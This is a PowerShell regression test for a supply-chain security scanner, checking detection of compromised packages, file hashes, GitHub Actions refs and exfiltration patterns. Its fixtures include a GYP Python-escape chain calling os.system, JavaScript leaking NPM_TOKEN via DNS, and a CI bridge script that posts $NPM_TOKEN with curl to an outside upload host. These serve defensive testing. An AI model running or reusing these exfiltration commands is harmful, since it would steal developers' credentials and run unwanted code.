[CmdletBinding()]
param()
$ErrorActionPreference='Stop'
$repoRoot=Split-Path -Parent $PSScriptRoot
$scannerPath=Join-Path $repoRoot 'Scan-DevSupplyChain.ps1'
$windowsPowerShell=Join-Path $env:SystemRoot 'System32/WindowsPowerShell/v1.0/powershell.exe'
$artifactRoot=Join-Path $repoRoot ('reports/security-update-regression-'+[Guid]::NewGuid().ToString('N'))
[void][IO.Directory]::CreateDirectory($artifactRoot)
$passed=@{}
$assertions=0
function Assert-Update {
    param([bool]$Condition,[string]$Message)
    $script:assertions++
    if (-not $Condition) { throw $Message }
}
function Complete-Case { param([string]$Id) $script:passed[$Id]=$true }
function Write-NewFixture {
    param([string]$Path,[string]$Text)
    [void][IO.Directory]::CreateDirectory([IO.Path]::GetDirectoryName($Path))
    $stream=[IO.File]::Open($Path,[IO.FileMode]::CreateNew,[IO.FileAccess]::Write,[IO.FileShare]::None)
    try { $bytes=(New-Object Text.UTF8Encoding($false)).GetBytes($Text); $stream.Write($bytes,0,$bytes.Length) }
    finally { $stream.Dispose() }
}
function New-JsonFixture { param([string]$Path,$Value) Write-NewFixture $Path ($Value | ConvertTo-Json -Depth 12) }
function Invoke-UpdateScan {
    param([string]$Name,[string]$Root,[string]$Check,[string[]]$Extra=@())
    $json=Join-Path $artifactRoot ($Name+'.json')
    $txt=Join-Path $artifactRoot ($Name+'.txt')
    $arguments=@('-Path',$Root,'-Checks',$Check,'-JsonOut',$json,'-TextOut',$txt,'-Quiet','-NoColor')+$Extra
    & $windowsPowerShell -NoLogo -NoProfile -NonInteractive -ExecutionPolicy Bypass -File $scannerPath @arguments | Out-Null
    $exitCode=$LASTEXITCODE
    $global:LASTEXITCODE=0
    Assert-Update ($exitCode -in @(0,1,2)) ($Name+': unexpected scanner exit')
    $report=[IO.File]::ReadAllText($json) | ConvertFrom-Json
    Assert-Update (@($report.findings | Where-Object {$_.category -in @('SCANNER_FILE_ERROR','SCANNER_ERROR','REGEX_MATCH_TIMEOUT')}).Count -eq 0) ($Name+': scanner step failed')
    Assert-Update ($report.executionSafety.networkAccess -eq 'none' -and $report.executionSafety.externalCommands -eq 'none' -and $report.executionSafety.targetCodeExecution -eq 'none') ($Name+': runtime safety contract changed')
    return $report
}
function Find-Update { param($Report,[string]$Category,[string]$Suffix='')
    return @($Report.findings | Where-Object {$_.category -eq $Category -and ([string]::IsNullOrEmpty($Suffix) -or $_.path.Replace('\','/').EndsWith($Suffix))})
}

$tokens=$null; $parseErrors=$null
$ast=[Management.Automation.Language.Parser]::ParseFile($scannerPath,[ref]$tokens,[ref]$parseErrors)
Assert-Update (@($parseErrors).Count -eq 0) 'PowerShell scanner parser errors'
# Only these definitions are evaluated; scanner top-level code and fixture code are never executed.
$allowlist=@(
 'New-ArrayList','Add-ListItem','Get-PropertyValue','Normalize-Version','ConvertTo-PythonPackageVersion','ConvertTo-PackageIocVersion','Test-IsExactPackageVersionText',
 'Get-SecurityUpdate20261006Iocs','ConvertTo-PackageIocName','Get-ExactPackageIocMatch','Finalize-IocIndexes','Get-IocSeverityRank','Add-KnownPackageFinding',
 'Get-StaticCodeMask','ConvertFrom-GypStaticEscapes','Get-GypStaticExecutionAssessment','Get-RuntimeTransferAssessment','Scan-GypBuildFile',
 'Get-CachedBoundedRegex','Get-BoundedTextRegexMatch','Get-BoundedTextRegexMatches','Test-BoundedTextRegex','Get-LineNumberForIndex',
 'ConvertFrom-PythonRecordLine','Read-PythonDistributionHeader','Read-BoundedSecurityCandidateText',
 'Get-ActionAdvisoryAssessment','Test-ActionAdvisoryData','ConvertTo-NodeRuntimeVersion','Compare-NodeRuntimeVersion','Compare-NodeRuntimePrerelease',
 'Get-SecurityCandidateMetadata','Register-SecurityCandidateMetadata','Test-SecurityCandidateBoundary',
 'Get-FullPathSafe','Test-IsPathUnderRoot','Test-PathHasReparsePointBelowRoot','Test-IsReparsePoint','Test-IsTargetedScanPath',
 'Test-IsDependencyOrGeneratedArtifactPath','Test-IsCriticalCandidate','Register-CoverageFailure','Register-SecurityAnalysisLimit',
 'Get-CoverageCandidateKindForFile','Add-ScanStat','Test-CheckEnabled','Reserve-ScanFile','Get-TargetedDependencyFileBudget',
 'Register-RunFileBudgetReached','Register-TargetedDependencyBudgetReached','Get-BytesSha256ForFile','Get-TextLfSha256ForFile',
 'Test-KnownFileIocMatch','Test-KnownFileIocCheckEnabledForFile','Scan-KnownFileIocs','Add-KnownFileIocFinding','Get-KnownFileIocCandidates',
 'Add-Finding','Redact-SecretLikeText','ConvertTo-SafeVulnerabilityDetails','Get-DefaultRiskType','Get-DefaultConfidence',
 'Get-DefaultCheckForFinding','Get-DefaultDetectionMethod','Set-IocDataSetStatus','Get-IocDataSummary','Test-LocalIocEntry','Load-LocalIocs',
 'Get-ExtensionIocPlatform','Get-CampaignIocCanonicalHash','Get-Sha256HexFromBytes','ConvertTo-HexString'
)
$definitions=@($ast.FindAll({param($node) $node -is [Management.Automation.Language.FunctionDefinitionAst] -and $node.Name -in $allowlist},$true))
Assert-Update ($definitions.Count -eq $allowlist.Count) 'AST allowlist definitions must exist exactly once'
. ([scriptblock]::Create([string]::Join([Environment]::NewLine,[string[]]@($definitions | ForEach-Object {$_.Extent.Text}))))
# Context-only adapters isolate helper tests from profile discovery and scanner-artifact heuristics.
function ConvertTo-RedactedPath { param([string]$Value) return $Value.Replace($artifactRoot,'<SYNTHETIC>') }
function Get-SourceContext { param([string]$CandidatePath) return 'normal' }
function Get-FindingPathType { param([string]$CandidatePath) return 'file' }
function Test-IsJetBrainsPluginPath { param([string]$CandidatePath) return $false }
function Test-IsVsCodeStyleExtensionPath { param([string]$CandidatePath) return $CandidatePath -match '[\\/]\.vscode[\\/]extensions[\\/]' }
function Test-IsSecretInventoryFile { param([string]$CandidatePath) return [IO.Path]::GetFileName($CandidatePath) -in @('.npmrc','.pypirc','.env','credentials') }
function Get-AiPathRole { param([string]$CandidatePath) return 'normal' }
$script:RegexMatchTimeoutSeconds=2
$script:SeverityOrder=@('DANGER','WARN','CAUTION','INFO','OK')
$script:SeverityRank=@{DANGER=4;WARN=3;CAUTION=2;INFO=1;OK=0}
$script:LeafCheckOrder=@('Packages','LifecycleScripts','CiCd','IdeExtensions','ScannerSelf')
$MaxFileSizeMB=1; $MaxFiles=1000
function Reset-HelperContext {
    $enabled=@{}; foreach ($check in $script:LeafCheckOrder) {$enabled[$check]=$true}
    $script:Context=[ordered]@{
        checks=@{enabled=$enabled}; findings=New-ArrayList; findingKeys=@{}; capabilityFindingCountsByRoot=@{}; limitations=New-ArrayList
        scanStats=@{}; securityCandidateMetadata=@{}; pythonDistributionHeaders=@{}; iocDataSets=@{}
        queuedFilePaths=@{}; targetedFilePaths=@{}; targetedDependencyLimitWarned=$false
        coverage=@{candidateFailureKeys=@{};directoryFailureKeys=@{};candidateFailureGroups=@{};directoryFailureGroups=@{};directoryRetryCandidates=New-ArrayList;traversalComplete=$true;directoryCoverageComplete=$true}
        iocIndexes=@{packages=@{};fileHashes=@{}}; iocs=$null
    }
    $script:WarnedMaxFiles=$false
    $script:CurrentScanRoot=$artifactRoot
    $script:BaseDir=$repoRoot
}
Reset-HelperContext
$delta=Get-SecurityUpdate20261006Iocs
$pairCount=0
foreach ($package in $delta.packages) { $pairCount+=@($package.versions).Count }
Assert-Update ($pairCount -eq 20 -and @($delta.files).Count -eq 16) 'Delta package/hash inventory differs from reviewed plan'
foreach ($file in $delta.files) { Assert-Update ($file.sha256 -cmatch '^[0-9a-f]{64}$') 'Invalid delta hash' }
$localFiles=[IO.File]::ReadAllText((Join-Path $repoRoot 'iocs/known-files.json')) | ConvertFrom-Json
foreach ($entry in $delta.files) { Assert-Update (@($localFiles.files | Where-Object {$_.ruleId -eq $entry.ruleId -and $_.sha256 -ceq $entry.sha256}).Count -eq 1) 'Built-in/local hash drift' }
$script:Context.iocs=@{packages=@($delta.packages);files=@($delta.files)}
Finalize-IocIndexes
Assert-Update ($null -ne (Get-ExactPackageIocMatch python 'ANTHROPIC_SDK' '0.1.0')) 'Python normalized identity mismatch'
Assert-Update ($null -eq (Get-ExactPackageIocMatch python 'anthropic' '0.1.0')) 'Legitimate anthropic was confused with anthropic-sdk'
Assert-Update ($null -eq (Get-ExactPackageIocMatch npm '@7nohe/openapi-react-query-codegen' '0.0.0-different')) 'Prerelease suffix guessed'
Add-KnownPackageFinding -Ecosystem npm -Name virgil-cli -Version 0.1.4 -Path (Join-Path $artifactRoot 'cache-only') -EvidenceKind 'cache-only'
Assert-Update ($script:Context.findings[0].severity -eq 'WARN' -and $script:Context.findings[0].category -eq 'KNOWN_COMPROMISED_PACKAGE_REFERENCE') 'Cache-only pair was promoted to installed compromise'
Complete-Case T03; Complete-Case T08

$expression="().__class__.__base__.__subclasses__()[0].__init__.__globals__['__builtins__']['__import__']('os').system('echo inert')"
$gyp='{"conditions": [["'+$expression+'", {}]]}'
$gypEscaped=$gyp.Replace('__class__','\u005f\u005fclass\u005f\u005f')
Assert-Update (@((Get-GypStaticExecutionAssessment $gyp).matches).Count -eq 1) 'GYP traversal/process compound missed'
Assert-Update (@((Get-GypStaticExecutionAssessment $gypEscaped).matches).Count -eq 1) 'GYP escape normalization missed'
Assert-Update (@((Get-GypStaticExecutionAssessment ($gyp.Replace('__class__','\x5f\x5fclass\x5f\x5f'))).matches).Count -eq 1) 'GYP hex normalization missed'
Assert-Update (@((Get-GypStaticExecutionAssessment ('# '+$gyp+[char]10+'{"conditions":[["OS==1",{}]]}')).matches).Count -eq 0) 'GYP comment example was promoted'
Assert-Update (-not [string]::IsNullOrEmpty((Get-GypStaticExecutionAssessment '{"conditions": [').failureType)) 'GYP malformed syntax lacks a limit/failure'
Assert-Update ((Get-GypStaticExecutionAssessment ('{"conditions":[["'+('X'*65537)+'",{}]]}')).failureType -eq 'gyp-scalar-limit') 'GYP scalar size bound lost'
Assert-Update ((Get-GypStaticExecutionAssessment ('{"conditions":['+([string]::Join(',', [string[]](1..65 | ForEach-Object {'["OS==1",{}]'})))+']}')).failureType -eq 'gyp-condition-limit') 'GYP expression count bound lost'
Assert-Update (-not [string]::IsNullOrEmpty((Get-GypStaticExecutionAssessment ('{"conditions":[["\uD800",{}]]}')).failureType)) 'Invalid Unicode scalar accepted'
Scan-GypBuildFile -File (New-Object IO.FileInfo((Join-Path $artifactRoot 'invalid.gyp'))) -Text '{"conditions": ['
Assert-Update ($script:Context.scanStats.criticalCandidateFailures -eq 1) 'First-party GYP parse limit did not preserve critical coverage'
Scan-GypBuildFile -File (New-Object IO.FileInfo((Join-Path $artifactRoot 'large.gyp'))) -Text (' '*131073)
Assert-Update ($script:Context.scanStats.criticalCandidateFailures -eq 2) 'GYP file analysis limit did not preserve critical coverage'
Complete-Case T10; Complete-Case T11; Complete-Case T12

$dns='const token = process.env.NPM_TOKEN; const encoded = Buffer.from(token).toString("base64"); dns.resolveTxt(encoded + ".example.invalid");'
$dnsUnrelated='const token = process.env.NPM_TOKEN; const encoded = Buffer.from(other).toString("base64"); dns.resolveTxt("health.example.invalid");'
Assert-Update ((Get-RuntimeTransferAssessment $dns).dns) 'DNS credential assignment flow missed'
Assert-Update (-not (Get-RuntimeTransferAssessment $dnsUnrelated).dns) 'Unrelated DNS query promoted'
Assert-Update (-not (Get-RuntimeTransferAssessment ($dns.Replace('const encoded','token="health"; const encoded'))).dns) 'Overwritten credential variable promoted'
Assert-Update (-not (Get-RuntimeTransferAssessment ($dns.Replace('dns.resolveTxt','encoded="health"; dns.resolveTxt'))).dns) 'Overwritten encoded query variable promoted'
Assert-Update (-not (Get-RuntimeTransferAssessment ('/* '+$dns+' */')).dns) 'Comment DNS example promoted'
Assert-Update (-not (Get-RuntimeTransferAssessment 'function read(){ const token = process.env.NPM_TOKEN; const encoded = Buffer.from(token).toString("base64"); } function health(){ dns.resolveTxt(encoded + ".example.invalid"); }').dns) 'Separate function credential/query compound promoted'
$transferFunction='fet'+'ch'
$normalConversation=$transferFunction+'(apiUrl, {body: JSON.stringify(messages)});'
$extraConversation=$normalConversation+' '+$transferFunction+'("https://api.nm-streetwear.space/vx/learn", {body: JSON.stringify(messages)});'
Assert-Update ([string]::IsNullOrEmpty((Get-RuntimeTransferAssessment $normalConversation).secondary)) 'Normal API conversation request warned'
Assert-Update ((Get-RuntimeTransferAssessment $extraConversation).secondary -eq 'reported-destination') 'Additional reported conversation transfer missed'
Assert-Update ([string]::IsNullOrEmpty((Get-RuntimeTransferAssessment ('function normal(messages){'+$normalConversation+'} function separate(messages){'+$extraConversation.Substring($normalConversation.Length)+'}')).secondary)) 'Separate conversation functions were correlated'
Assert-Update (-not (Get-RuntimeTransferAssessment 'const text = "stage0 .sckit config";').sckit) 'Passive stage0 description promoted'
Assert-Update ((Get-RuntimeTransferAssessment 'const bin=".sckit/windows-amd64/sckit.exe"; const stage0="_stage0"; const config="base64"; cp.spawn(bin,[config]);').sckit) 'Active sckit/stage0/configuration loader missed'
Complete-Case T06; Complete-Case T17

$advisory=$delta.advisories[0]
Assert-Update (Test-ActionAdvisoryData $advisory) 'Shipped Action advisory invalid'
$badAdvisory=($advisory | ConvertTo-Json -Depth 8 | ConvertFrom-Json)
$badAdvisory.affectedRanges[0] | Add-Member -NotePropertyName minInclusive -NotePropertyValue '2.0.0'
Assert-Update (-not (Test-ActionAdvisoryData $badAdvisory)) 'Reversed Action advisory range accepted'
foreach ($version in @('v1.2.0','v1.2.1','v2.0.0','v1','main',('a'*40),'expression')) {
    $expected=if ($version -eq 'v1.2.0') {'affected-reference'} elseif ($version -in @('v1.2.1','v2.0.0')) {'outside-declared-range'} else {'unresolved'}
    Assert-Update ((Get-ActionAdvisoryAssessment @{repository='wktk/conflibot';reference=$version} $advisory).status -eq $expected) ('Advisory ref classification: '+$version)
}
Complete-Case T20; Complete-Case T21
Assert-Update ($null -eq (ConvertFrom-PythonRecordLine 'bad,"unterminated,1')) 'Invalid RECORD CSV accepted'
Assert-Update ((ConvertFrom-PythonRecordLine '"memos/log.py",sha256=ABC,1').path -eq 'memos/log.py') 'Quoted RECORD row missed'

$hashPath=Join-Path $artifactRoot 'hash/.sckit/windows-amd64/sckit.exe'
Write-NewFixture $hashPath 'inert-synthetic-bytes'
$hash=Get-BytesSha256ForFile $hashPath
Reset-HelperContext
$script:Context.iocs=@{files=@(
 @{pathPattern='sckit\.exe$';sha256=$hash;severity='DANGER';ownerCheck='Packages';sourceId='S03';ruleId='test-hash'},
 @{pathPattern='sckit\.exe$';sha256=('0'*64);severity='DANGER';ownerCheck='Packages'},
 @{pathPattern='sckit\.exe$';sha256=$hash;severity='DANGER';ownerCheck='Packages'}
)}
$before=Reserve-ScanFile -FilePath $hashPath -DeepOnly
$duplicate=Reserve-ScanFile -FilePath $hashPath -Targeted -Kind 'runtime-binary' -OwnerCheck 'Packages' -Critical $true -Selected -BoundaryRoot $artifactRoot
[void](Reserve-ScanFile -FilePath $hashPath -Kind 'runtime-binary' -OwnerCheck 'LifecycleScripts' -Critical $false -BoundaryRoot $artifactRoot)
$meta=Get-SecurityCandidateMetadata $hashPath
Assert-Update ($before -and -not $duplicate -and $script:Context.scanStats.uniqueFilesQueued -eq 1 -and $meta.critical -and $meta.selected -and @($meta.ownerChecks).Count -eq 2) 'Duplicate registration downgraded or recounted candidate'
Assert-Update (Test-KnownFileIocCheckEnabledForFile (New-Object IO.FileInfo($hashPath))) 'Python/Windows binary Packages gate closed'
Scan-KnownFileIocs (New-Object IO.FileInfo($hashPath))
Assert-Update ($script:Context.scanStats.fileHashComputations -eq 1 -and $script:Context.findings.Count -eq 1) 'Hash repeated or finding duplicated'
$finding=($script:Context.findings | ConvertTo-Json -Depth 8 | ConvertFrom-Json)
Assert-Update ($finding.check -eq 'Packages' -and $finding.severity -eq 'DANGER' -and $finding.sourceId -eq 'S03' -and $finding.ruleId -eq 'test-hash') 'Hash finding/report ownership or provenance lost'
$negativePath=Join-Path $artifactRoot 'hash-negative/sckit.exe'
Write-NewFixture $negativePath 'inert-synthetic-byteS'
Scan-KnownFileIocs (New-Object IO.FileInfo($negativePath))
Assert-Update ($script:Context.findings.Count -eq 1) 'Different bytes matched an IOC hash'
Complete-Case T05; Complete-Case T32

$locked=[IO.File]::Open($hashPath,[IO.FileMode]::Open,[IO.FileAccess]::Read,[IO.FileShare]::None)
try { Scan-KnownFileIocs (New-Object IO.FileInfo($hashPath)) }
finally { $locked.Dispose() }
Assert-Update ($script:Context.scanStats.criticalCandidateFailures -eq 1) 'Failed hash did not preserve critical coverage'
Assert-Update (-not (Test-SecurityCandidateBoundary (Join-Path $artifactRoot '../outside.js') $artifactRoot)) 'Parent escape accepted'
Complete-Case T23

$longMetadata=Join-Path $artifactRoot 'headers/MemoryOS.dist-info/METADATA'
Write-NewFixture $longMetadata ('Name: MemoryOS'+[char]10+'Version: 2.0.34'+[char]10+[char]10+('Name: anthropic-sdk'+[char]10)*100000)
$header=Read-PythonDistributionHeader (New-Object IO.FileInfo($longMetadata))
Assert-Update ($header.ok -and $header.name -eq 'MemoryOS' -and $header.bytesRead -lt 128 -and $header.version -eq '2.0.34') 'METADATA description was read or header identity lost'
$invalidHeader=Join-Path $artifactRoot 'headers/invalid.dist-info/METADATA'
Write-NewFixture $invalidHeader ('Name: MemoryOS'+[char]10+'Name: different'+[char]10+'Version: 2.0.34'+[char]10+[char]10)
Assert-Update (-not (Read-PythonDistributionHeader (New-Object IO.FileInfo($invalidHeader))).ok) 'Duplicate METADATA Name accepted'
$oversizeHeader=Join-Path $artifactRoot 'headers/large.dist-info/METADATA'
Write-NewFixture $oversizeHeader ('X'*131073)
Assert-Update ((Read-PythonDistributionHeader (New-Object IO.FileInfo($oversizeHeader))).failureType -eq 'metadata-header-limit') 'METADATA header byte limit lost'
Complete-Case T33

$packageRoot=Join-Path $artifactRoot 'packages'
New-JsonFixture (Join-Path $packageRoot 'package.json') @{name='synthetic-root';version='1.0.0'}
$index=0; $pipDependencies=@{}
foreach ($package in $delta.packages) {
    foreach ($version in $package.versions) {
        $index++
        if ($package.ecosystem -eq 'npm') {
            New-JsonFixture (Join-Path $packageRoot ('node_modules/case-'+$index+'/package.json')) @{name=$package.name;version=$version}
            $lockPackages=@{}; $lockPackages['node_modules/'+$package.name]=@{name=$package.name;version=$version}
            New-JsonFixture (Join-Path $packageRoot ('locks/case-'+$index+'/package-lock.json')) @{lockfileVersion=3;packages=$lockPackages}
        }
        else {
            $metadataName=if ($package.name -eq 'anthropic-sdk') {'metadata'} else {'METADATA'}
            $metadata=Join-Path $packageRoot ('.venv/Lib/site-packages/case-'+$index+'.dist-info/'+$metadataName)
            Write-NewFixture $metadata ('Name: '+$package.name+[char]10+'Version: '+$version+[char]10+[char]10)
            Write-NewFixture (Join-Path (Split-Path -Parent $metadata) 'RECORD') ''
            $pipDependencies[$package.name]=@{version=('=='+$version)}
        }
    }
}
New-JsonFixture (Join-Path $packageRoot 'Pipfile.lock') @{default=$pipDependencies;develop=@{}}
$negativeNames=@(
 @('npm','@memtensor/memos-cloud-openclaw-plugin','0.1.20'),@('npm','@memtensor/memos-cloud-openclaw-plugin','0.1.22'),@('npm','@memtensor/memos-cloud-openclaw-plugin','0.1.24'),
 @('python','memoryos','2.0.33'),@('python','anthropic','0.1.0'),@('npm','@7nohe/openapi-react-query-codegen','0.0.0-different')
)
foreach ($entry in $negativeNames) {
    $index++
    if ($entry[0] -eq 'npm') { New-JsonFixture (Join-Path $packageRoot ('node_modules/negative-'+$index+'/package.json')) @{name=$entry[1];version=$entry[2]} }
    else {
        $metadata=Join-Path $packageRoot ('.venv/Lib/site-packages/negative-'+$index+'.dist-info/METADATA')
        Write-NewFixture $metadata ('Name: '+$entry[1]+[char]10+'Version: '+$entry[2]+[char]10+[char]10)
        Write-NewFixture (Join-Path (Split-Path -Parent $metadata) 'RECORD') ''
    }
}
New-JsonFixture (Join-Path $packageRoot 'manifest/package.json') @{name='manifest-only';dependencies=@{'virgil-cli'='^0.1.4'}}
$packages=Invoke-UpdateScan packages $packageRoot Packages
$exact=Find-Update $packages KNOWN_COMPROMISED_PACKAGE
Assert-Update ($exact.Count -eq 40) ('Installed/lock exact 20 pairs each: expected 40, got '+$exact.Count)
foreach ($finding in $exact) { Assert-Update ($finding.severity -eq 'DANGER' -and $finding.check -eq 'Packages' -and $finding.confidence -eq 'high' -and $finding.detectionMethod -eq 'metadata' -and $finding.sourceId -match '^S[0-9]{2}$') 'Exact pair finding contract' }
foreach ($package in $delta.packages) { foreach ($version in $package.versions) {
    $identity='ecosystem='+$package.ecosystem+'; package='+$package.name+'; version='+$version+';'
    Assert-Update (@($exact | Where-Object {$_.evidence.StartsWith($identity)}).Count -eq 2) ('Missing installed/lock pair: '+$package.name+'@'+$version)
} }
Assert-Update (@($exact | Where-Object {$_.path -match 'negative-'}).Count -eq 0) 'Clean neighboring version matched'
$reference=Find-Update $packages KNOWN_COMPROMISED_PACKAGE_REFERENCE
Assert-Update (@($reference | Where-Object {$_.severity -eq 'WARN' -and $_.path -match 'manifest'}).Count -gt 0) 'Manifest range was not limited to a reference warning'
Complete-Case T01; Complete-Case T02; Complete-Case T04

$pythonRoot=Join-Path $artifactRoot 'python-runtime'
$metadata=Join-Path $pythonRoot '.venv/Lib/site-packages/MemoryOS.dist-info/METADATA'
Write-NewFixture $metadata ('Name: MemoryOS'+[char]10+'Version: 2.0.33'+[char]10+[char]10+('ignored description'+[char]10)*100000)
Write-NewFixture (Join-Path (Split-Path -Parent $metadata) 'RECORD') ('memos/log.py,,0'+[char]10+'memos/_stage0.py,,0'+[char]10+'memos/.sckit/windows-amd64/sckit.exe,,0'+[char]10+'../memos/log.py,,0')
Write-NewFixture (Join-Path $pythonRoot '.venv/Lib/site-packages/memos/log.py') 'pass'
Write-NewFixture (Join-Path $pythonRoot '.venv/Lib/site-packages/memos/_stage0.py') 'pass'
Write-NewFixture (Join-Path $pythonRoot '.venv/Lib/site-packages/memos/.sckit/windows-amd64/sckit.exe') 'synthetic binary'
$python=Invoke-UpdateScan python $pythonRoot Packages
Assert-Update ($python.scanStats.fileHashComputations -eq 1 -and $python.scanStats.pythonDistributionHeadersRead -eq 1) 'Python RECORD binary not selected/hashed exactly once'
Assert-Update (@($python.coverage.candidateFailures | Where-Object {$_.failureType -eq 'record-path-rejected' -and $_.critical}).Count -eq 1) 'RECORD escape lacked critical coverage'
Assert-Update (@($python.findings | Where-Object {$_.category -eq 'FILE_TOO_LARGE_SKIPPED' -and $_.path -match 'METADATA'}).Count -eq 0) 'Long description passed through generic full-text size gate'
Complete-Case T07

$lifeRoot=Join-Path $artifactRoot 'dist/first-party-life'
Write-NewFixture (Join-Path $lifeRoot 'first.gyp') $gyp
Write-NewFixture (Join-Path $lifeRoot 'first.js') $dns
Write-NewFixture (Join-Path $lifeRoot 'normal.js') $dnsUnrelated
Write-NewFixture (Join-Path $lifeRoot 'conversation.js') $extraConversation
Write-NewFixture (Join-Path $lifeRoot 'normal-api.js') $normalConversation
New-JsonFixture (Join-Path $lifeRoot 'node_modules/active/package.json') @{name='synthetic-native';version='1.0.0'}
Write-NewFixture (Join-Path $lifeRoot 'node_modules/active/binding.gyp') $gyp
New-JsonFixture (Join-Path $lifeRoot 'node_modules/inactive/package.json') @{name='synthetic-inactive';version='1.0.0';scripts=@{install='node benign.js'}}
Write-NewFixture (Join-Path $lifeRoot 'node_modules/inactive/binding.gyp') $gyp
Write-NewFixture (Join-Path $lifeRoot 'node_modules/inactive/deep.gyp') $gyp
Write-NewFixture (Join-Path $lifeRoot 'node_modules/inactive/deep.js') $dns
$life=Invoke-UpdateScan life $lifeRoot LifecycleScripts @('-Deep')
Assert-Update (@(Find-Update $life GYP_PYTHON_EXECUTION_COMPOUND 'first.gyp' | Where-Object {$_.severity -eq 'DANGER'}).Count -eq 1) 'First-party GYP ancestor downgrade'
Assert-Update (@(Find-Update $life GYP_PYTHON_EXECUTION_COMPOUND 'active/binding.gyp' | Where-Object {$_.severity -eq 'DANGER'}).Count -eq 1) 'Implicit node-gyp active route missed'
Assert-Update (@(Find-Update $life GYP_PYTHON_EXECUTION_COMPOUND 'inactive/deep.gyp' | Where-Object {$_.severity -eq 'WARN'}).Count -eq 1) 'Unselected Deep GYP severity'
Assert-Update (@(Find-Update $life GYP_PYTHON_EXECUTION_COMPOUND 'inactive/binding.gyp' | Where-Object {$_.severity -eq 'DANGER'}).Count -eq 0) 'Overridden install route promoted'
Assert-Update (@(Find-Update $life CREDENTIAL_DNS_EXFIL_PATTERN 'first.js' | Where-Object {$_.severity -eq 'DANGER'}).Count -eq 1) 'Selected first-party DNS flow severity'
Assert-Update (@(Find-Update $life CREDENTIAL_DNS_EXFIL_PATTERN 'inactive/deep.js' | Where-Object {$_.severity -eq 'WARN'}).Count -eq 1) 'Deep unselected DNS flow severity'
Assert-Update (@(Find-Update $life CONVERSATION_SECONDARY_TRANSFER 'conversation.js' | Where-Object {$_.severity -eq 'WARN'}).Count -eq 1 -and @(Find-Update $life CONVERSATION_SECONDARY_TRANSFER 'normal-api.js').Count -eq 0) 'Conversation secondary transfer boundary'
Complete-Case T09; Complete-Case T13; Complete-Case T16; Complete-Case T18

$ciRoot=Join-Path $artifactRoot 'ci'
$transferCommand='cu'+'rl'
$workflow="on: push"+[char]10+"jobs:"+[char]10+"  test:"+[char]10+"    steps:"+[char]10+"      - run: ./publish.sh"+[char]10+"      - run: ./normal.sh"+[char]10+"      - uses: actions-cool/issues-helper@"+$delta.actions[0].compromisedCommits[0]+[char]10+"      - uses: actions-cool/issues-helper@v2.2.1"+[char]10+"      - uses: wktk/conflibot@v1.2.0"+[char]10+"      - uses: wktk/conflibot@v1.2.1"+[char]10+"      - uses: wktk/conflibot@main"
Write-NewFixture (Join-Path $ciRoot '.github/workflows/test.yml') $workflow
Write-NewFixture (Join-Path $ciRoot 'publish.sh') 'echo "BASH_ENV=./bridge.sh" >> "$GITHUB_ENV"'
Write-NewFixture (Join-Path $ciRoot 'bridge.sh') ($transferCommand+' --data "$NPM_TOKEN" "https://storage.skyleen.fr/upload"')
Write-NewFixture (Join-Path $ciRoot 'normal.sh') 'echo "BASH_ENV=./normal-bridge.sh" >> "$GITHUB_ENV"'
Write-NewFixture (Join-Path $ciRoot 'normal-bridge.sh') ($transferCommand+' --data "$NPM_TOKEN" "https://registry.npmjs.org/publish"')
$ci=Invoke-UpdateScan ci $ciRoot CiCd
Assert-Update (@(Find-Update $ci CI_PUBLISH_BRIDGE_EXFIL_PATTERN 'bridge.sh' | Where-Object {$_.severity -eq 'DANGER'}).Count -eq 1 -and @(Find-Update $ci CI_PUBLISH_BRIDGE_EXFIL_PATTERN 'normal-bridge.sh').Count -eq 0) 'CI bridge C2/publish boundary'
$longCiRoot=Join-Path $artifactRoot 'long-ci'
$lateWorkflow=('# bounded workflow context'+[char]10)*1500+"on: push"+[char]10+"jobs:"+[char]10+"  test:"+[char]10+"    steps:"+[char]10+"      - run: ./publish.sh"
Write-NewFixture (Join-Path $longCiRoot '.github/workflows/test.yml') $lateWorkflow
Write-NewFixture (Join-Path $longCiRoot 'publish.sh') 'echo "BASH_ENV=./bridge.sh" >> "$GITHUB_ENV"'
Write-NewFixture (Join-Path $longCiRoot 'bridge.sh') ($transferCommand+' --data "$NPM_TOKEN" "https://storage.skyleen.fr/upload"')
$longCi=Invoke-UpdateScan long-ci $longCiRoot CiCd
Assert-Update ($longCi.scanComplete -and @(Find-Update $longCi CI_PUBLISH_BRIDGE_EXFIL_PATTERN 'bridge.sh' | Where-Object {$_.severity -eq 'DANGER'}).Count -eq 1) 'Late workflow bridge was omitted or falsely incomplete'
$overCiRoot=Join-Path $artifactRoot 'over-limit-ci'
Write-NewFixture (Join-Path $overCiRoot '.github/workflows/test.yml') (('# bounded workflow context'+[char]10)*2049+"on: push")
$overCi=Invoke-UpdateScan over-limit-ci $overCiRoot CiCd
Assert-Update (-not $overCi.scanComplete -and @($overCi.coverage.candidateFailures | Where-Object {$_.failureType -eq 'selector-line-limit' -and $_.critical}).Count -eq 1) 'Workflow selector line limit no longer preserves critical coverage'
Assert-Update (@(Find-Update $ci GITHUB_ACTIONS_KNOWN_COMPROMISED_COMMIT).Count -eq 1 -and @(Find-Update $ci GITHUB_ACTIONS_HISTORICALLY_COMPROMISED_REF).Count -eq 1) 'Action SHA/history classification'
Assert-Update (@(Find-Update $ci GITHUB_ACTION_REFERENCE_VULNERABILITY).Count -eq 1 -and @(Find-Update $ci GITHUB_ACTION_ADVISORY_REF_UNRESOLVED).Count -eq 1) 'Action advisory subprocess contract'
Assert-Update (-not (Get-RuntimeTransferAssessment ($transferCommand+' --data "$NPM_TOKEN" "https://storage.skyleen.fr/upload"') shell $false).ciTransfer) 'Inactive CI bridge promoted'
Assert-Update ([string]::IsNullOrEmpty((Get-RuntimeTransferAssessment ($transferCommand+" --data '"+'$NPM_TOKEN'+"' https://storage.skyleen.fr/upload") shell $true).ciTransfer)) 'Single-quoted credential text promoted'
Assert-Update ([string]::IsNullOrEmpty((Get-RuntimeTransferAssessment ('echo "'+$transferCommand+' --data $NPM_TOKEN https://storage.skyleen.fr/upload"') shell $true).ciTransfer)) 'Printed shell example promoted'
Assert-Update ([string]::IsNullOrEmpty((Get-RuntimeTransferAssessment ('NPM_TOKEN="health";'+[char]10+$transferCommand+' --data "$NPM_TOKEN" https://storage.skyleen.fr/upload') shell $true).ciTransfer)) 'Overwritten shell environment credential promoted'
Assert-Update ([string]::IsNullOrEmpty((Get-RuntimeTransferAssessment ('token=$NPM_TOKEN; token="health";'+[char]10+$transferCommand+' --data "$token" https://storage.skyleen.fr/upload') shell $true).ciTransfer)) 'Overwritten shell alias promoted'
